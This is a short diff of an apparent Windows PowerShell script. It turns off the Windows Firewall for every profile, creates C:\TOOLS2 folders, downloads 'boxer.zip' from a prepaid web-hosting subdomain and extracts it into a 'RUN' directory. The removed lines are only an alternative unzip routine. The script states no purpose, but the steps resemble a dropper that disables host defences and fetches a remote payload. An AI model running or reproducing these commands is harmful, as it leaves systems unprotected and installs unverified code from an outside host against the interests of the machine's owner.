@@ -4,11 +4,6 @@ Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
 New-Item -ItemType "directory" -Force -Path "c:\TOOLS2"
 New-Item -ItemType "directory" -Force -Path "C:\TOOLS2\RUN\"
 
-
-$ExtractShell = New-Object -ComObject Shell.Application 
-$Files = $ExtractShell.Namespace($ZipFile).Items() 
-$ExtractShell.NameSpace($Destination).CopyHere($Files) 
-
 Invoke-WebRequest -Uri "https://35393-59932.77.prepaid-webspace.de/BOXER/boxer.zip" -OutFile C:\TOOLS2\boxer.zip
 Expand-Archive -LiteralPath 'C:\TOOLS2\boxer.zip' -DestinationPath C:\TOOLS2\RUN\
 
